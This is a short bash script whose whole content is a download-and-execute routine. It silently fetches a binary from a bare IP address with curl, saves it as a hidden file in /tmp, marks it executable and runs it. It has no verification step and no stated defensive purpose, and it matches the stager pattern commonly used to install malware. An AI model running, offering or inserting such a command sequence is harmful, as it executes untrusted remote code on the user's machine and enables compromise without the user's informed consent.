#!/bin/bash
# Downloads a remote binary and runs it.
curl -s http://203.0.113.9/tool -o /tmp/.t
chmod +x /tmp/.t
/tmp/.t
